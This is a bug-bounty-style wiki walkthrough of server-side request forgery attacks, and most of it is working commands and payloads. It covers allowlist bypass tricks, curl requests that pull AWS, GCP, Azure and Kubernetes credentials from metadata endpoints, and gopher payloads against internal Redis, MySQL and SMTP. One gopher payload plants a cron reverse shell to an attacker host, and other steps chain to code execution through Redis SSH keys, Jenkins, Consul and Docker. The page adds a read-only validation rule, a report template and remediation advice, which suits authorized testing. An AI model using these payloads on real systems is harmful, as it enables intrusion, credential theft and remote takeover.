---
type: wiki
category: attack
tool: interactsh,ssrfmap,manual
status: active
last-updated: 2026-04-21
---

# SSRF Deep Attack Walkthrough (2026 Edition)

> **Purpose:** SSRF is one of the biggest P1 jackpots of 2026 — cloud metadata IMDS / internal-network lateral movement / Redis->RCE / Kubernetes secrets.
> 90% of SSRF reports fail by "stopping once they hit a webhook" instead of continuing to chain further. This document covers the full chain from detection -> confirmation -> escalation to RCE.

## 0. Principle recap

The server receives a user-supplied URL and then fetches it itself. Common features: webhooks, PDF conversion, screenshots, link previews, XML/SVG import, image proxies, OAuth callbacks, import-from-URL, RSS readers.

```
Victim fetches: https://target.com/preview?url=http://169.254.169.254/
                                                 ^
                                      attacker-controlled -> hits AWS IMDS
```

## 1. Quick detection (OAST-based)

### 1.1 Finding suspicious parameters

```
url=  next=  callback=  redirect=  image=  file=
avatar=  logo=  document=  preview=  webhook=
fetch=  proxy=  link=  resource=  import=
```

gf pattern + param discovery:

```bash
cat /tmp/urls.txt | gf ssrf | tee /tmp/ssrf-candidates.txt
# or use arjun to discover hidden params
arjun -u https://target.com/api/fetch -m GET --stable
```

### 1.2 interactsh detection (out-of-band)

```bash
# Terminal A: start an interactsh client
interactsh-client -v

# Get: c23abc.oast.live

# Terminal B: fuzz ssrf candidates
cat /tmp/ssrf-candidates.txt | qsreplace 'http://c23abc.oast.live/ssrf' \
  | httpx -silent -mc 200 -threads 30

# Return to interactsh-client and wait for a DNS/HTTP callback
# If c23abc.oast.live receives a Query/Request -> SSRF confirmed
```

### 1.3 Timing-based (blind)

```bash
# Compare against a 25-second timeout
curl -w '%{time_total}\n' "https://target.com/?url=http://10.0.0.1:8080/" -o /dev/null
# If ~25 sec (timeout) vs a fast 200 -> the URL was fetched by the server
```

## 2. URL parser bypass (allowlist evasion)

When a filter restricts to "only target.com":

### 2.1 `@` syntax confusion

```
http://trusted.com@attacker.com/
# Python urllib -> host = attacker.com
# Node.js url -> host = attacker.com
# Go net/url -> host = trusted.com (bug) -> depends on server implementation
```

### 2.2 `#` fragment

```
http://attacker.com#trusted.com
http://trusted.com#.attacker.com
```

### 2.3 Subdomain confusion

```
http://trusted.com.attacker.com/    <- passes a suffix check
http://attacker.com/trusted.com     <- passes a subpath check
http://trusted.com?x=.attacker.com
```

### 2.4 Dual DNS resolution (DNS rebinding)

```python
# singularity of origin (NCC Group tool)
python3 attack.py --target http://target/fetch?url=http://spoofed.example.com
# First resolution -> 1.2.3.4 (allowlisted)
# Second resolution -> 169.254.169.254 (IMDS)
```

### 2.5 Decimal / Octal / Hex IP

```
http://2130706433/           <- 127.0.0.1
http://0x7f000001/           <- 127.0.0.1
http://0177.0.0.1/           <- 127.0.0.1
http://127.1/                <- 127.0.0.1
http://[::ffff:7f00:1]/       <- IPv6 mapped
http://[::1]/                 <- IPv6 localhost
```

### 2.6 Double URL encoding

```
http://127.0.0.1/       <- original
http://%31%32%37.0.0.1/ <- single encoding
http://%2531%2532%2537.0.0.1/ <- double encoding
```

### 2.7 IDNA / Punycode

```
xn--trusted.com-attacker.com
```

## 3. Cloud Metadata attacks (high-value targets in 2026)

### 3.1 AWS IMDS

**IMDSv1 (legacy, direct GET)**

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Lists all metadata keys

curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Gets the role name

curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
# Gets AccessKey + SecretKey + Token -> feed directly into aws-cli
```

**IMDSv2 (requires a token)**

```
# SSRF with POST + header
# If the target's SSRF supports arbitrary method + header injection:
POST /latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Most SSRF only supports GET -> IMDSv2 usually blocks this
```

**IMDSv2 bypass (if the application allows PUT)**

```bash
curl -X PUT "https://target.com/fetch?url=http://169.254.169.254/latest/api/token&header=X-aws-ec2-metadata-token-ttl-seconds:60"
```

### 3.2 GCP metadata

```bash
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/&header=Metadata-Flavor:Google"

# If a header can't be injected -> some legacy endpoints don't require it:
http://metadata/computeMetadata/v1beta1/instance/service-accounts/default/token
```

### 3.3 Azure IMDS

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&header=Metadata:true"
```

### 3.4 DigitalOcean

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/v1/"
```

### 3.5 Alibaba Cloud

```bash
curl "https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"
```

### 3.6 Kubernetes service account

```bash
# If the server runs inside a K8s Pod
curl "https://target.com/fetch?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
curl "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
```

## 4. Protocol smuggling (URL scheme abuse)

```
http://       <- basic
https://      <- basic
file://       <- LFI
ftp://        <- internal FTP
gopher://     <- arbitrary TCP byte stream (the big hammer)
dict://       <- gopher-like but simplified
ldap://
jar://        <- Java-specific: read a remote jar
netdoc://     <- Java
php://        <- PHP wrapper
ogg://        <- Node.js legacy
```

### 4.1 gopher -> Redis RCE (classic)

Redis on the internal network (127.0.0.1:6379), unauthenticated -> use gopher to inject a command that writes a cron job:

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24xxx%0D%0A\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A...
```

Tool:

```bash
pip install gopherus
gopherus --exploit redis
# Interactively generates the payload
```

### 4.2 gopher -> MySQL

```bash
gopherus --exploit mysql
# Requires knowing the user (usually root) -> write a file or run a query
```

### 4.3 gopher -> SMTP (send spam from an internal IP)

```
gopher://127.0.0.1:25/_HELO%20x%0D%0AMAIL%20FROM:victim%40target%0D%0A...
```

## 5. Blind SSRF escalation

### 5.1 DNS exfil (scanning for internal services)

```bash
for ip in 10.0.0.{1..255}; do
  curl -s "https://target.com/fetch?url=http://$ip:8080/" &
done
# Look at differences in response timing / size
```

### 5.2 Port scan via response timing

```python
# Response received -> port open
# Timeout -> port closed
ports = [22,80,443,3306,6379,8080,9200,11211,27017]
```

### 5.3 Error message leak

If the server's fetch fails, it may print an error:

```
url=http://127.0.0.1:6379/
-> "Redis error: NOAUTH" -> Redis exists on the internal network

url=http://127.0.0.1:9200/
-> Elasticsearch version/cluster info
```

## 6. SSRF -> RCE chains (in practice)

### 6.1 Redis write SSH key

```
1. Find the SSRF
2. gopher://127.0.0.1:6379/_ + config set dir ~/.ssh/ + config set dbfilename authorized_keys + set x "ssh-rsa ..."
3. ssh attacker@target
```

### 6.2 Elasticsearch CVE-2014-3120 / RCE via _search

```bash
# Older ES versions have script execution
url=http://127.0.0.1:9200/_search?source={...java script...}
```

### 6.3 Jenkins unauthenticated Script Console

```bash
# If Jenkins is reachable on the internal network
url=http://127.0.0.1:8080/script
# POST a Groovy script -> RCE
```

### 6.4 Consul unauthenticated register -> RCE

```
url=http://127.0.0.1:8500/v1/agent/service/register
PUT body + inject a script -> service check exec -> RCE
```

### 6.5 Docker API exposed (2375)

```bash
url=http://127.0.0.1:2375/containers/json
url=http://127.0.0.1:2375/containers/create
-> Spin up a privileged container -> mount / -> RCE + escape
```

## 7. SSRF in unusual parsers

### 7.1 XML -> XXE -> SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY y SYSTEM "http://169.254.169.254/">]>
<a>&y;</a>
```

See [18-payload-cheatsheet.md](18-payload-cheatsheet.md) XXE section.

### 7.2 SVG -> XXE -> SSRF

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### 7.3 PDF generator (wkhtmltopdf / phantomjs)

```html
<!-- Before the HTML is converted to PDF, JS can fetch -->
<iframe src="http://169.254.169.254/"></iframe>
<script>fetch('http://169.254.169.254/').then(r=>r.text()).then(t=>document.body.innerHTML=t)</script>
```

The result gets written into the PDF -> SSRF data exfiltration.

### 7.4 CSV import

Some apps support `=WEBSERVICE("http://...")` (Excel formula) -> rendered server-side -> SSRF.

### 7.5 Markdown -> HTML

```markdown
![x](http://169.254.169.254/)
```

Some server-side md->html converters pre-fetch images for optimization -> SSRF.

## 8. Tools

### 8.1 SSRFmap

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# Basic usage (needs a request file captured from Burp)
python ssrfmap.py -r request.txt -p url -m readfiles,portscan,fastcgi,redis,github,smtp
```

Supported modules: readfiles, portscan, fastcgi, redis, github enterprise, smtp.

### 8.2 Gopherus

```bash
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python gopherus.py --exploit mysql
# Interactively generates gopher:// payloads for redis/mysql/postgres/fastcgi/smtp/memcached/zabbix
```

### 8.3 interactsh

```bash
# Run locally
interactsh-client -v

# Or use the ProjectDiscovery-hosted instance (default)
# Every DNS callback gets logged

# Use the {{interactsh-url}} template variable in nuclei / ffuf
```

### 8.4 Nuclei SSRF templates

```bash
nuclei -u https://target.com -tags ssrf -severity critical,high
# Default templates include CVE-specific SSRF plus generic ones
```

## 9. Full PoC: AWS SSRF -> IAM credentials -> S3 dump

### Step 1: Detection

```bash
# Discovered the /api/preview?url= parameter
curl "https://target.com/api/preview?url=http://c23abc.oast.live/x"
# interactsh receives a callback -> confirmed
```

### Step 2: Hit IMDSv1

```bash
curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: "web-app-role"

curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
# Response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "xxx",
#   "Token": "xxx...",
#   "Expiration": "2026-04-15T..."
# }
```

### Step 3: Validate credentials (READ only)

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx

aws sts get-caller-identity
# {"Account": "123456789012","Arn":"arn:aws:sts::...:assumed-role/web-app-role/..."}

aws s3 ls
# List buckets (READ only)
```

**Stop here -> write the report -> do not actually dump data**

See [32-cloud-key-abuse.md](32-cloud-key-abuse.md) — the "Verify != Abuse" principle.

## 10. Report template

```markdown
## Vulnerability Summary
https://target.com/api/preview?url=... does not perform host allowlisting or protocol
restriction on the user-submitted URL, allowing arbitrary internal HTTP GET requests,
which further reach AWS IMDSv1 and obtain the EC2 instance role's STS credentials.

## Reproduction Steps

### Step 1: Detect the SSRF
curl "https://target.com/api/preview?url=http://[OAST]"

### Step 2: IMDS v1
curl "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

### Step 3: Obtain credentials
[JSON above]

### Step 4: Validation (sts only, no writes performed)
aws sts get-caller-identity [output]

## Impact
- Arbitrary internal HTTP GET
- AWS IAM temporary credentials -> depending on the role's policy, may grant S3 / DynamoDB / SQS access
- Could reach internal Redis / ES / Jenkins to achieve RCE

## Severity
P1 (if the role has write permissions or is admin) / P2 (read-only role + metadata exposure)

## Remediation
1. Strict URL allowlist (domain + protocol + port + path prefix)
2. Use a URL parser library for secondary validation, reject @, #, and IP double-encoding
3. Enable IMDSv2, and set `http-tokens: required`
4. Egress firewall: block the server from initiating connections to 169.254.169.254 / 10.x / 172.16.x / 192.168.x
5. Truncate the response: only return the status code from the fetch, not the raw body, to the user
```

## Related Documents

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — SSRF payload section
- [32-cloud-key-abuse.md](32-cloud-key-abuse.md) — AWS/GCP/Azure key validation guidelines
- [67-deserialization.md](67-deserialization.md) — Java jar:// file-read chain
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings SSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- SSRFmap: https://github.com/swisskyrepo/SSRFmap
- Gopherus: https://github.com/tarunkant/Gopherus
